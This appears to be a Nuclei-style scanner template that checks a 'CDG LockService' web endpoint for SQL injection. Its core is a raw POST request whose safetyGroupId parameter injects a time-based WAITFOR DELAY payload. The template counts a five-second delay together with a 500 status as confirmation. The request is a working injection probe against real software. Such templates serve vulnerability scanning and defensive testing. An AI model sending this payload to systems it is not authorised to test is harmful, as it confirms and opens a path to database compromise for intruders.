id: CDG-LockService-sqlInjection

info:
  name: CDG-LockService-sqlInjection
  author: iSee857
  severity: high
  description: CDG-LockService-sqlInjection

requests:
  - method: POST
    raw:
      - |
        POST /CDGServer3/lock/LockService;Servicelogin HTTP/1.1
        Host: {{Host}}
        Content-type:application/x-www-form-urlencoded

        command=AddLockToSafetyGroup&safetyGroupId=123'%3bWAITFOR+DELAY+'0%3a0%3a5'--&fromurl=/client/clientList.jsp&lockKeyId=1
      
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "duration >= 5"

      - type: status
        status:
          - 500